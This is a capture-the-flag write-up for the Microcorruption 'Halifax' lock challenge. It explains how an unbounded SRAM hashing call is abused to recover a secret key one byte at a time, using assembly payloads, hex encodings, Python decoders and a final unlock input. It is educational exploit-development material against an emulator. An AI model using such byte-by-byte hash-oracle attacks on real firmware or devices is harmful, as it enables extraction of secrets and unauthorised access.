# Halifax - 20 points
 
## The idea
Exploitation of the ability to extract the hash of any part I want,<br />
and in any size I want, from a memory that is not accessible.

## The way

### Black box test:
Let's look at the challenge instructions:

<img src="./24.1.png" width="80%"></img>
* we can't unlock the door by 0x7f interrupt anymore
* ther is a mistake here. it's 0x42.
* payload is very clearly. we can divide it to 3 parts:
    * dest - `8000`
    * size of code - `02`
    * code - `3041`

Let's also look at how it looks in the user window:

<img src="./24.2.png" width="80%"></img>
* red - it's a mistake. 0x42, not 0x41.

Let's explore the code.

### Explore the code:

Below is the main function of the program.<br />
Immediately afterwards a reconstruction of this code will appear in c.<br />
I did this to make it easier to explain, so read it carefully as well.

<img src="./24.3.png"></img>
<img src="./24.4.png"></img>

```c
#define MAX_SIZE 0x400
#define void func(void);

typedef (short)*(0x2400) dest;
typedef (char)*(0x2402) size;

void main()
{
    char stack_memory[0x20];

    puts("Welcome to the test program loader.");

    puts("Enablibg hardened mode");
    INT(0x40); // init the SRAM.

    puts("Verifying 0x7f interrupt disable");
    INT(0x7f); // unlock-the-door interrupt doesn't work anymore.
    puts("0x7f interrupt disabled, key stored in internal SRAM");

    // there is a mistake here. the interrupt number is 0x42, not 0x41.
    puts("unlock by providing the 16 byte key to 0x42 interrupt");

    // extract result of sha256(SRAM) into the top of the stack.
    memset(stack_memory, 0, 0x20);
    puts("Internul SRAM Hash:");
    sha256_internal(0, 0x1000, stack_memory);

    /*
        Some loop that prints the result of the abouve function.
        From the stack, to the screen.
    */

    while(1)
    {
        puts("Please enter debug payload.");
        memset(0x2400, 0, MAX_SIZE);
        getsn(0x2400, MAX_SIZE - 1);

        if(size < 2)
        {
            puts("Invalid payload length");
            continue;
        }

        puts("Executing debug payload");
        memcpy(dest, 0x2403, size);  // copy user program into dest
        ((func*)dest)();             // execute the user program
    }
}
```

So we can run any code we want, but we won't be able to open the door with the 0x7f interface like we did in all the previous challenges.<br />

Let's pay attention to the `sha256_internal` function:
* param1 - offset from the beginning of the SRAM.
* param2 - size of bytes from the offset to take
* param3 - Destination address for the memory accessible to us, to which the result of the function will be written.
    * The result is the sha256 of the bytes we selected from the SRAM.

So the password is somewhere in a memory area whose size is 0x1000 bytes and which is not accessible to us.<br />

what can we do?

### How to exploit:
Let's pay attention again to the `sha256_internal` function.<br />
It does not limit the amount of bytes it hashes.<br />
That means you can also extract each byte there separately.<br />
Therefore, as a start only, we will try to extract all the SRAM and hash it.<br />
The following code extracts the first 0x400 bytes from SRAM, where each byte becomes a 16-byte hash and is stored in memory.

```asm
; save registers
push	r8
push	r9
push	r10
push	r11
push	r13
push	r14
push	r15

; init values.
mov	#0x400, r11 ; i = 0x400
mov	#0x6000, r8 ; init destination
mov	#0x1, r9    ; init size
clr	r10         ; init offset from start of SRAM.

; while loop
mov	r8, r13
mov	r9, r14
mov	r10, r15
call	#0x45b6 ; sha256_internal(offset, size, dest)
add	#0x20, r8   ; the next dest address, so as not to overrun the previous result.
inc	r10         ; offset++
dec	r11         ; i--
jnz	$-0x14      ; while(i>0) 

; restoring registers
pop	r15
pop	r14
pop	r13
pop	r11
pop	r10
pop	r9
pop	r8
ret
```

So this is the code: `081209120a120b120d120e120f123b40000438400060394001003a4000000d480e490f4ab012b645385020003a5001001b83f5233f413e413d413b413a41394138413041`<br />
Size is: 0x44<br />
And we will arbitrarily decide that the code will enter address 0x5000.
We will add them all and get: `5000 44 081209120a120b120d120e120f123b40000438400060394001003a4000000d480e490f4ab012b645385020003a5001001b83f5233f413e413d413b413a41394138413041`<br />
And now we will see the results in memory:

<img src="./24.5.png" width="80%"></img>
* First part is the code at address 0x5000
* The second is the sha256 of all the first 0x400 bytes.
    * sha256(0, 1, 0x6000)
    * sha256(1, 1, 0x6020)
    * sha256(2, 1, 0x6040)
    * sha256(3, 1, 0x6060)
    * ...
    * sha256(0x400, 1, 0xdfe0)

Before we get the SRAM bytes out of what came out, we will note that at some point the value of all the bytes is the same.

<img src="./24.6.png" width="80%"></img>
* sha256('\x00') == 6e340b9cffb37a989ca544e6bb780a2c78901d3fb33738768511a30617afa01d
* That means we won't have to look for the password in all the SRAM...

Now we will copy all of this hex dump into a text file, and create a program that will decode it and print the entire SRAM in bytes.<br />
Note: We only extracted 0x400 bytes out of 0x1000.<br />
Therefore we will fill in all the rest with zeros.

<img src="./24.7.png" width="80%"></img>

```python
from hashlib import sha256
 
FILENAME = "hexdump.txt"
 
def extract_hashes():
    # extract lines of content
    with open(FILENAME, 'r') as hexdump_file:
        hexdump_lines = hexdump_file.readlines()
    
    # extract just the binaries content from heach line
    bytes_str = ''
    for line in hexdump_lines:
        bytes_str += line[6:46].replace(' ', '')
    
    # divide bytes to groups of 32 bytes (size of sha256)
    # note: 64=32*2 because every letter here actualy is byte, but represent nibble..
    return [bytes_str[64*i:64*(i+1)] for i in range(len(bytes_str)//64)]
 

def convert_hashes_to_bytes(hashes):
    # build dictionary: {sha256(byte): byte}
    hash_byte_dict = {}
    for i in range(256):
        curr_byte = bytes.fromhex(hex(i)[2:].zfill(2))
        hash_byte_dict.update({sha256(curr_byte).hexdigest() : i})
    
    # convert every hash to byte
    return [hash_byte_dict.get(h) for h in hashes] 
 

def print_SRAM(first_bytes):    
    SRAM = ''
    for b in first_bytes:
        SRAM += hex(b)[2:].zfill(2) # remove the '0x'
    
    SRAM += '00' * (0x1000-0x400)   # completes the rest of the bytes
    
    # print all the SRAM and the sha256(SRAM)
    print("SRAM 0x00-0x1000:\n" + SRAM)
    print("sha256(SRAM) =", sha256(bytes.fromhex(SRAM)).hexdigest())
 

def main():
    # extract hashes from hexdump.txt
    original_hashes = extract_hashes()
    
    # convert every hash to the correct byte
    original_bytes = convert_hashes_to_bytes(original_hashes)
    
    # prints all the SRAM as bytes.
    print_SRAM(original_bytes)
 

if __name__ == '__main__':
    main()
```

And these are the results:
<img src="./24.8.png"></img>
* blue - 0x1000 bytes of SRAM
* yellow - sha256(SRAM)

See the hash circled in yellow `7622e88825895c37fcd6d0f1307647a3b673b009390b5be9a65a84a2546ef731`.<br />
It's the same hash that is shown to us in the user window (first picture, scroll up).<br />
This means that we managed to extract all the SRAM memory at this moment!

You can see that there are 0x140 bytes with content and everything else is empty.<bt />
If we restart the challenge again, then we will find that INT(0x40) is actually responsible for changing the SRAM content every time.<br />
And no, he is not responsible for the hard mode. I checked.<br />
And trial and error reveals to us that SRAM contains after INT(0x40) or 0x140 bytes, or 0x40 bytes.<br />
In the previous images you can see 0x140 bytes. Let's see SRAM with 0x40 bytes:

<img src="./24.9.png" width="80%"></img>
<img src="./24.10.png"></img>

And because there is no sequence of 16 bytes that can be compared between the two SRAMs, then it can be assumed that the password changes every time.<br />
but therefore its place is fixed...<br />
But where?

So I built a code that goes through all the sequences of length 16 that were extracted before (like a window that scrolls along the buffer).<br />
The code is copied to memory and immediately after that the content of the extracted SRAM will be attached.<br />
so that the code will pass it.

```asm
; save registers
push	r10
push	r11

mov     #0x40, r10     ; counter = 0x40
mov	    #0x5026, r11   ; pointer to first "potential passowrd" (0-16, 1-17, 2-18..., 0x40 - 0x50)

; while(counter > 0)

; try to unlock the door
push	r11            ; <TAG>
push	#0x42
call	#0x4550        ; INT
add	    #0x4, sp

inc	    r11            ; go to the next "potential password" 
dec	    r10            ; counter--
jnz	    $-0x12         ; jump to <TAG>

; restoring registers
pop	    r11
pop	    r10
ret
```

So this code is: `0a120b123a4040003b4026500b1230124200b012504521523b5001001a83f6233b413a413041`<br />
Current SRAM 0x40 bytes of contet is: `de1f6be4a8f08cdf834206e83e0579d313751750df2b790b82e3be262493b68c5033a925aeaefab3f6e8e26bc8390c326cc3458d91c90ad6849926fa809681d0`<br />
Size is: 0x26 + 0x40 = 0x66
And we will arbitrarily decide that the code will enter address 0x5000.<br />
We will add them all and get: `5000 66 0a120b123a4040003b4026500b1230124200b012504521523b5001001a83f6233b413a413041 de1f6be4a8f08cdf834206e83e0579d313751750df2b790b82e3be262493b68c5033a925aeaefab3f6e8e26bc8390c326cc3458d91c90ad6849926fa809681d0`<br />

But it is important to say, in this case even if the door opens it will not help.<br />
Because we used the memory itself to extract the information, and we will not be able to do this in the solve screen.<br />
Therefore, we will carefully **just debug this code** and follow the _r11_ register that holds the pointer to the potential password.<br />
When the door opens, we will remember the last value of _r11_, so we can easily know where the password is:<br />

<img src="./24.11.png" width="80%"></img>
* `5056` - 0x5056 is the correct pointer to the password.
* remember: 0x5026 it was the pointer to the first byte in this SRAM content.
* So offset of password is 0x5056 - 0x5026 = 0x30

And that's how it will be found that the **password at offset 0x30 from the start on SRAM**

Therefore, for the solution made in the solve screen:
* we have to print to the screen the 16 hashes for 16 bytes.
* starting from offset 0x30.
* and then convert them to a password.

So this is the code that will print the 16 hashes to the screen, each hash will be for one byte of the password.<br />
Note: The print part is taken directly from main, so the result of the hash for each byte will enter the top of the stack and overwrite the previous one.

```asm
; init values.
mov	    #0x10, r8          ; counter = 16 (length of the password)
mov	    #0x43e0, r4        ; init destination
mov	    #0x1, r5           ; init size
mov	    #0x30, r6          ; offset of the first password byte inside SRAM.

; while(counter > 0)
mov	    r4, r13            ; <TAG>
mov	    r5, r14
mov	    r6, r15
call	#0x45b6            ; sha256_internal(offset, size, dest)

;------------------------------------------------------
; Start of the loop that prints the hash to the screen.
;------------------------------------------------------
clr	    r11
mov	    #0x43e0, r15
add	    r11, r15
mov.b	@r15, r14
mov	    r14, r15
and	    #0xf, r15
mov.b	0x4710(r15), r10
clrc
rrc.b	r14
clrc
rrc.b	r14
clrc
rrc.b	r14
clrc
rrc.b	r14
and	    #0xf, r14
mov.b	0x4710(r14), r15
call	#0x4578 <putchar>
mov.b	r10, r15
call	#0x4578 <putchar>
inc 	r11
cmp	    #0x20, r11
jnz	    $-0x3a
;-----------------------------------------------------
; Ends of the loop that prints the hash to the screen.
;-----------------------------------------------------

inc     r6                 ; offset++
dec     r8                 ; counter--
jnz     $-0x4c             ; jump to <TAG>
ret
```

So this code is: `384010003440e04335400100364030000d440e450f46b012b6450b433f40e0430f5b6e4f0f4e3ff00f005a4f104712c34e1012c34e1012c34e1012c34e103ef00f005f4e1047b01278454f4ab01278451b533b902000e22316531883d9233041`<br />
Size is: 0x60<br />
And we will arbitrarily decide that the code will enter address 0x5000.<br />
We will add them all and get: `5000 60 384010003440e04335400100364030000d440e450f46b012b6450b433f40e0430f5b6e4f0f4e3ff00f005a4f104712c34e1012c34e1012c34e1012c34e103ef00f005f4e1047b01278454f4ab01278451b533b902000e22316531883d9233041`

This is how the screen will look to the user after the above code:
<img src="./24.12.png" width="80%"></img>

We will copy the long yellow sequence:<br />
`DE7D1B721A1E0632B7CF04EDF5032C8ECFFA9F9A08492152B926F1A5A7E765D71DD8312636F6A0BF3D21FA2855E63072507453E93A5CED4301B364E91C9D87D630A5BFA58E128AF9E5A4955725D8AD26D4D574A537B58B7DC6D357ACAD578572B12DC850A3B0A3B79FC2255E175241CE20489FE45DF93FF35C42C6C348DF4FBF4C94485E0C21AE6C41CE1DFE7B6BFACEEA5AB68E40A2476F50208E526F50608088AA3E3B1F22C616B1817981215E7D1E75FA32B22233EBB8477F64600A5ACE1F5FECEB66FFC86F38D952786C6D696C79C2DBC239DD4E91B46729D73A27FB57E93F79BB7B435B05321651DAEFD374CDC681DC06FAA65E374E38337B88CA046DEA414A21E525A759E3FFEB22556BE6348A92D5A13E40B61A0805F36F18C29095134BF5122F344554C53BDE2EBB8CD2B7E3D1600AD631C385A5D7CCE23C7785459AA5AB782C805E8BFBE34CB65742A0471CF5A53A97F0A1160AB6CCCBB64C9131CE08F271887CE94707DA822D5263BAE19D5519CB3614E0DAEDC4C7CE5DAB7473F1B7D25296E7BC6A6BF66DA09B1C5ED273D99E3A9FC6D43E46CCB8B358FA13D4E9043A718774C572BD8A25ADBEB1BFCD5C0256AE11CECF9F9C3F925D0E52BEAF89BBEEBD879E1DFF6918546DC0C179FDDE505F2A21591C9A9C96E36B054EC5AF83BCEEF655B5A034911F1C3718CE056531B45EF03B4C7B1F15629E867294011A7D`<br />
It constitutes 16 hashes, each hash for one byte in the password.<br />
Let's build a Python code that will extract the password from this:

```python
from hashlib import sha256

PASSWORD_HASHES = "DE7D1B721A1E0632B7CF04EDF5032C8ECFFA9F9A08492152B926F1A5A7E765D71DD8312636F6A0BF3D21FA2855E63072507453E93A5CED4301B364E91C9D87D630A5BFA58E128AF9E5A4955725D8AD26D4D574A537B58B7DC6D357ACAD578572B12DC850A3B0A3B79FC2255E175241CE20489FE45DF93FF35C42C6C348DF4FBF4C94485E0C21AE6C41CE1DFE7B6BFACEEA5AB68E40A2476F50208E526F50608088AA3E3B1F22C616B1817981215E7D1E75FA32B22233EBB8477F64600A5ACE1F5FECEB66FFC86F38D952786C6D696C79C2DBC239DD4E91B46729D73A27FB57E93F79BB7B435B05321651DAEFD374CDC681DC06FAA65E374E38337B88CA046DEA414A21E525A759E3FFEB22556BE6348A92D5A13E40B61A0805F36F18C29095134BF5122F344554C53BDE2EBB8CD2B7E3D1600AD631C385A5D7CCE23C7785459AA5AB782C805E8BFBE34CB65742A0471CF5A53A97F0A1160AB6CCCBB64C9131CE08F271887CE94707DA822D5263BAE19D5519CB3614E0DAEDC4C7CE5DAB7473F1B7D25296E7BC6A6BF66DA09B1C5ED273D99E3A9FC6D43E46CCB8B358FA13D4E9043A718774C572BD8A25ADBEB1BFCD5C0256AE11CECF9F9C3F925D0E52BEAF89BBEEBD879E1DFF6918546DC0C179FDDE505F2A21591C9A9C96E36B054EC5AF83BCEEF655B5A034911F1C3718CE056531B45EF03B4C7B1F15629E867294011A7D".lower()

def convert_hashes_to_bytes(hashes):
    # build dictionary: {sha256(byte): byte}
    hash_byte_dict = {}
    for i in range(256):
        curr_byte = bytes.fromhex(hex(i)[2:].zfill(2))
        hash_byte_dict.update({sha256(curr_byte).hexdigest() : i})
    
    # convert every hash to byte
    return [hash_byte_dict.get(h) for h in hashes] 
 

def main():
    # Divide the long raw data into 16 groups
    hashes_list = [PASSWORD_HASHES[64*i:64*(i+1)] for i in range(16)]
    
    # convert every hash to the correct byte
    password_bytes = convert_hashes_to_bytes(hashes_list)
 
    # Prints the password
    password = ''
    for b in password_bytes:
        password += hex(b)[2:].zfill(2) # remove '0x'
    print("Password is: " + password)

if __name__ == '__main__':
    main()
```

<img src="./24.13.png" width="80%"></img>

So, this is the password: `69cce2bf76a43065d701824ddb735aaa`
All that remains is to provide it to interrupt 0x42.<br />
And so now we have built a code that opens the door.

```asm
push	#0x500c ; pointer to password, immediatly after the code
push	#0x42
call	#0x4550 ; INT
```

Code is: `30120c5030124200b0125045`
Password is: `69cce2bf76a43065d701824ddb735aaa 00` (0x0 at the end.)
Size is: 0xc + 0x10 = 0x1c
And we will arbitrarily decide that the code will enter address 0x5000.<br />
We will add them all and get: `5000 1c 30120c5030124200b0125045 69cce2bf76a43065d701824ddb735aaa 00`


## The cracking input (as bytes)
```

```